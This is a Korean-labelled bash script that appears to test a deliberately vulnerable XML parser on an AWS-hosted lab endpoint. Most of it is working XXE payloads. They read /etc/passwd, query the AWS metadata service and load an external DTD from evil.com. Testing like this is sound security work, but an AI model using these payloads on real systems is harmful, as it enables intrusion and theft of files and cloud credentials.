#!/bin/bash

echo "=== XXE 공격 테스트 스크립트 ==="
echo "애플리케이션 URL: http://xxe-alb-1564899005.us-west-1.elb.amazonaws.com"
echo ""

# 1. 정상 요청 테스트
echo "1. 정상 XML 요청 테스트:"
curl -X POST http://xxe-alb-1564899005.us-west-1.elb.amazonaws.com/parse \
  -d "xml=<note><msg>Hello World</msg></note>" \
  -w "\nHTTP Status: %{http_code}\n" \
  -s
echo ""

# 2. DOCTYPE 공격 테스트
echo "2. DOCTYPE 공격 테스트:"
curl -X POST http://xxe-alb-1564899005.us-west-1.elb.amazonaws.com/parse \
  -d "xml=<!DOCTYPE test><test>Hello</test>" \
  -w "\nHTTP Status: %{http_code}\n" \
  -s
echo ""

# 3. ENTITY 공격 테스트
echo "3. ENTITY 공격 테스트:"
curl -X POST http://xxe-alb-1564899005.us-west-1.elb.amazonaws.com/parse \
  -d "xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>" \
  -w "\nHTTP Status: %{http_code}\n" \
  -s
echo ""

# 4. AWS 메타데이터 공격 테스트
echo "4. AWS 메타데이터 공격 테스트:"
curl -X POST http://xxe-alb-1564899005.us-west-1.elb.amazonaws.com/parse \
  -d "xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><test>&xxe;</test>" \
  -w "\nHTTP Status: %{http_code}\n" \
  -s
echo ""

# 5. data:// 프로토콜 공격 테스트
echo "5. data:// 프로토콜 공격 테스트:"
curl -X POST http://xxe-alb-1564899005.us-west-1.elb.amazonaws.com/parse \
  -d "xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM 'data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>]><test>&xxe;</test>" \
  -w "\nHTTP Status: %{http_code}\n" \
  -s
echo ""

# 6. php:// 프로토콜 공격 테스트
echo "6. php:// 프로토콜 공격 테스트:"
curl -X POST http://xxe-alb-1564899005.us-west-1.elb.amazonaws.com/parse \
  -d "xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'>]><test>&xxe;</test>" \
  -w "\nHTTP Status: %{http_code}\n" \
  -s
echo ""

# 7. CDATA 섹션 공격 테스트
echo "7. CDATA 섹션 공격 테스트:"
curl -X POST http://xxe-alb-1564899005.us-west-1.elb.amazonaws.com/parse \
  -d "xml=<test><![CDATA[<script>alert('XSS')</script>]]></test>" \
  -w "\nHTTP Status: %{http_code}\n" \
  -s
echo ""

# 8. 외부 DTD 참조 공격 테스트
echo "8. 외부 DTD 참조 공격 테스트:"
curl -X POST http://xxe-alb-1564899005.us-west-1.elb.amazonaws.com/parse \
  -d "xml=<!DOCTYPE test SYSTEM 'http://evil.com/malicious.dtd'><test>Hello</test>" \
  -w "\nHTTP Status: %{http_code}\n" \
  -s
echo ""

echo "=== 테스트 완료 ==="
